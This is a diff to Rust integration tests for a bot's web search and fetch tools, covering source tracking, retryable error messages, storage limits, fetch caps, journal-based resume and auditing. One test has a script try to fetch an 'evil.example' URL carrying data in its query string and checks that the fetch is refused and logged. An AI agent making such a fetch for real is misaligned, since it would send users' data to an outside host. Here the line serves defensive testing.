@@ -168,7 +168,7 @@ async fn a_search_then_a_fetch_of_a_result_is_answered_and_charged_twice() {
     // The step's calls say what each cost and where the URL came from.
     let calls = script_calls(&env, &run, 0);
     assert_eq!(calls[0]["web"], json!({"query": "rust"}));
-    assert_eq!(calls[1]["web"], json!({"url": a, "source": "search #0"}));
+    assert_eq!(calls[1]["web"], json!({"url": a, "source": "search #1"}));
     assert!(calls.iter().all(|c| c["cost_milli"].as_i64() > Some(0)));
     let web: Vec<Value> = env
         .bot_events()
@@ -183,7 +183,7 @@ async fn a_search_then_a_fetch_of_a_result_is_answered_and_charged_twice() {
     );
     assert_eq!(
         (&web[1]["op"], &web[1]["url"], &web[1]["source"]),
-        (&json!("web.fetch"), &json!(a), &json!("search #0"))
+        (&json!("web.fetch"), &json!(a), &json!("search #1"))
     );
 }
 
@@ -294,7 +294,7 @@ async fn a_link_in_a_fetched_page_may_be_fetched() {
     assert_eq!(web_rows(&env), [LINE_WEB_FETCH, LINE_WEB_FETCH]);
     let calls = script_calls(&env, &run, 0);
     assert_eq!(calls[0]["web"]["source"], "comment");
-    assert_eq!(calls[1]["web"]["source"], "page #0");
+    assert_eq!(calls[1]["web"]["source"], "page #1");
 }
 
 #[tokio::test]
@@ -550,13 +550,23 @@ async fn a_failed_search_is_free_and_a_failed_fetch_is_not() {
         "search,fetch",
         &format!(
             "const codes = [];
-             try {{ await clax.web.search('down'); }} catch (e) {{ codes.push(e.code); }}
-             try {{ await clax.web.fetch({a:?}); }} catch (e) {{ codes.push(e.code); }}
+             try {{ await clax.web.search('down'); }} catch (e) {{ codes.push([e.code, e.message]); }}
+             try {{ await clax.web.fetch({a:?}); }} catch (e) {{ codes.push([e.code, e.message]); }}
              return codes;"
         ),
     )
     .await;
-    assert_eq!(v, json!(["web_unavailable", "web_timeout"]));
+    // Both are retryable, and their messages say so.
+    assert_eq!(
+        v,
+        json!([
+            [
+                "web_unavailable",
+                "the provider is down (retryable: try again)"
+            ],
+            ["web_timeout", "too slow (retryable: try again)"]
+        ])
+    );
     assert_eq!(env.web().calls().len(), 2);
     assert_eq!(web_rows(&env), [LINE_WEB_FETCH]);
     let calls = script_calls(&env, &run, 0);
@@ -665,4 +675,235 @@ async fn left_counts_down() {
     assert_eq!(left(0), (json!(2), json!(2), before - ps));
     assert_eq!(left(1), (json!(2), json!(1), before - ps - pf));
     assert_eq!(left(2), (json!(1), json!(1), before - 2 * ps - pf));
+}
+
+#[tokio::test]
+async fn a_missing_web_cost_line_refuses_before_the_source() {
+    let env = Env::new().await;
+    let a = "https://example.com/a";
+    sender_says(&env, &format!("Read {a}"));
+    env.web().search_answers("q", hits(&[]));
+    env.web().page(a, page_at(a, "# A", &[]));
+    for line in [LINE_WEB_FETCH, SEARCH_LINE] {
+        env.store.delete_cost_line(&AuditCtx::DAEMON, line).unwrap();
+    }
+    let (_, v) = one_script(
+        &env,
+        "search,fetch",
+        &format!(
+            "const out = [];
+             try {{ await clax.web.search('q'); }} catch (e) {{ out.push([e.code, e.message]); }}
+             try {{ await clax.web.fetch({a:?}); }} catch (e) {{ out.push([e.code, e.message]); }}
+             return out;"
+        ),
+    )
+    .await;
+    for (i, line) in [SEARCH_LINE, LINE_WEB_FETCH].iter().enumerate() {
+        assert_eq!(v[i][0], "web_unavailable", "{v}");
+        let m = v[i][1].as_str().unwrap();
+        assert!(
+            m.contains("pricing is not configured") && m.contains(line),
+            "{m}"
+        );
+        assert!(!m.contains("retryable"), "{m}");
+    }
+    assert!(env.web().calls().is_empty());
+    assert!(web_rows(&env).is_empty());
+}
+
+#[tokio::test]
+async fn a_stored_page_must_be_read_in_its_format() {
+    let env = Env::new().await;
+    let a = "https://example.com/a";
+    sender_says(&env, &format!("Read {a}"));
+    env.web().page(a, page_at(a, "# A", &[]));
+    let (_, v) = one_script(
+        &env,
+        "fetch",
+        &format!(
+            "const p = await clax.web.fetch({a:?});
+             try {{ await clax.web.fetch({a:?}, {{format: 'raw'}}); return 'read'; }}
+             catch (e) {{ return [p.text, e.code, e.message]; }}"
+        ),
+    )
+    .await;
+    assert_eq!(v[0], "# A");
+    assert_eq!(v[1], "invalid_args");
+    assert!(
+        v[2].as_str()
+            .unwrap()
+            .contains("already read https://example.com/a as auto"),
+        "{v}"
+    );
+    assert_eq!(env.web().calls(), fetches(&[a]));
+}
+
+#[tokio::test]
+async fn a_page_over_the_store_limit_is_cut_on_a_character() {
+    let env = Env::new().await;
+    let a = "https://example.com/big";
+    sender_says(&env, &format!("Read {a}"));
+    // 600,000 two-byte characters: the store keeps the first 1 MiB.
+    env.web().page(a, page_at(a, &"é".repeat(600_000), &[]));
+    let (run, v) = one_script(
+        &env,
+        "fetch",
+        &format!(
+            "const p = await clax.web.fetch({a:?}, {{offset: 524000}});
+             const q = await clax.web.fetch({a:?}, {{offset: 530000}});
+             return [p.text.length, p.nextOffset, p.totalChars, q.offset, q.text, q.nextOffset];"
+        ),
+    )
+    .await;
+    assert_eq!(v, json!([288, null, 600_000, 524_288, "", null]));
+    let kept = env.store.web_page(&run, a).unwrap().unwrap();
+    assert_eq!(kept.text.len(), 1 << 20);
+    assert_eq!(kept.text.chars().count(), 524_288);
+    assert_eq!(kept.total_chars, 600_000);
+    assert_eq!(env.web().calls(), fetches(&[a]));
+}
+
+#[tokio::test]
+async fn a_stored_page_is_served_at_the_fetch_cap() {
+    let env = Env::new().await;
+    set(&env, &[(Setting::WebMaxFetchesPerRun, json!(1))]);
+    let (a, b) = ("https://example.com/a", "https://example.com/b");
+    sender_says(&env, &format!("Read {a} and {b}"));
+    env.web().page(a, page_at(a, "# A", &[]));
+    env.web().page(b, page_at(b, "# B", &[]));
+    let (_, v) = one_script(
+        &env,
+        "fetch",
+        &format!(
+            "const out = [];
+             for (const u of [{a:?}, {a:?}, {b:?}]) {{
+               try {{ const p = await clax.web.fetch(u); out.push([p.text, p.left.fetches]); }}
+               catch (e) {{ out.push(e.code); }}
+             }}
+             return out;"
+        ),
+    )
+    .await;
+    assert_eq!(v, json!([["# A", 0], ["# A", 0], "web_cap"]));
+    assert_eq!(env.web().calls(), fetches(&[a]));
+    assert_eq!(web_rows(&env), [LINE_WEB_FETCH]);
+}
+
+/// A fetch run whose script step is cut once after it fetched, and
+/// resumed by another driver after `between`; the run.
+async fn fetch_cut_then_resumed(env: &Env, a: &str, between: impl FnOnce(&Env)) -> String {
+    sender_says(env, &format!("Read {a}"));
+    env.web().page(a, page_at(a, "# A", &[]));
+    env.api.push(env.script_turn(
+        "tu_1",
+        "Read",
+        &format!("return (await clax.web.fetch({a:?})).text;"),
+    ));
+    env.api.push(finish_turn("done"));
+    let run = env.run_with_web("fetch");
+    let mut first = env.deps();
+    crash_once(
+        &mut first,
+        CrashPoint::BeforeCommit {
+            step: 2,
+            kind: StepKind::Script,
+        },
+    );
+    let out = env.drive(&first, &run, &DriverId::mint()).await;
+    assert_eq!(
+        out.last().unwrap().next,
+        Next::Waiting(clax_bot::Wait::Crashed)
+    );
+    between(env);
+    env.clock.advance(61);
+    let out = env.drive(&env.deps(), &run, &DriverId::mint()).await;
+    assert_eq!(out.last().unwrap().next, Next::Done(RunStatus::Finished));
+    run
+}
+
+#[tokio::test]
+async fn a_resumed_fetch_answers_from_the_journal_with_its_source_and_cost() {
+    let env = Env::new().await;
+    let a = "https://example.com/a";
+    let run = fetch_cut_then_resumed(&env, a, |_| {}).await;
+    assert_eq!(script_result(&env, &run, 0)["value"], "# A");
+    assert_eq!(env.web().calls(), fetches(&[a]));
+    assert_eq!(web_rows(&env), [LINE_WEB_FETCH]);
+    // The call the resumed step reports was answered from the journal,
+    // with what the first attempt recorded.
+    let call = &script_calls(&env, &run, 0)[0];
+    assert_eq!(call["web"], json!({"url": a, "source": "comment"}));
+    let charged = env.store.usage_of_run(&run).unwrap();
+    let charged = charged.iter().find(|r| r.line == LINE_WEB_FETCH).unwrap();
+    assert_eq!(call["cost_milli"], charged.credits_milli);
+    // The journal entry records the source that allowed the fetch.
+    let entry = &env.store.bot_calls(&run, 2).unwrap()[0];
+    assert_eq!(entry.result()["source"]["kind"], "comment");
+    assert_eq!(
+        entry.result()["source"]["comment_id"],
+        format!("c-{}", env.t1)
+    );
+    assert_eq!(entry.result()["format"], "auto");
+}
+
+#[tokio::test]
+async fn a_resumed_fetch_answers_from_the_journal_after_fetch_is_turned_off() {
+    let env = Env::new().await;
+    let a = "https://example.com/a";
+    let run = fetch_cut_then_resumed(&env, a, |env| {
+        set(env, &[(Setting::WebFetchEnabled, json!(false))]);
+    })
+    .await;
+    assert_eq!(script_result(&env, &run, 0)["value"], "# A");
+    assert_eq!(env.web().calls(), fetches(&[a]));
+    assert_eq!(web_rows(&env), [LINE_WEB_FETCH]);
+}
+
+#[tokio::test]
+async fn refused_and_stored_fetches_are_in_the_audit_trail() {
+    let env = Env::new().await;
+    let (a, evil) = ("https://example.com/a", "https://evil.example/?d=x");
+    sender_says(&env, &format!("Read {a}"));
+    env.web().page(a, page_at(a, "# A", &[]));
+    one_script(
+        &env,
+        "fetch",
+        &format!(
+            "try {{ await clax.web.fetch({evil:?}); }} catch (e) {{}}
+             await clax.web.fetch({a:?});
+             await clax.web.fetch({a:?});
+             return 1;"
+        ),
+    )
+    .await;
+    let web: Vec<Value> = env
+        .bot_events()
+        .into_iter()
+        .filter(|(k, _)| k == "bot.web")
+        .map(|(_, b)| b)
+        .collect();
+    assert_eq!(web.len(), 3, "{web:?}");
+    assert_eq!(
+        (
+            &web[0]["url"],
+            &web[0]["ok"],
+            &web[0]["code"],
+            &web[0]["credits_milli"]
+        ),
+        (
+            &json!(evil),
+            &json!(false),
+            &json!("url_not_in_prior_context"),
+            &json!(0)
+        )
+    );
+    assert_eq!(
+        (&web[1]["ok"], &web[1]["source"]),
+        (&json!(true), &json!("comment"))
+    );
+    assert!(web[1]["credits_milli"].as_i64() > Some(0));
+    assert_eq!(
+        (&web[2]["ok"], &web[2]["stored"], &web[2]["credits_milli"]),
+        (&json!(true), &json!(true), &json!(0))
+    );
 }
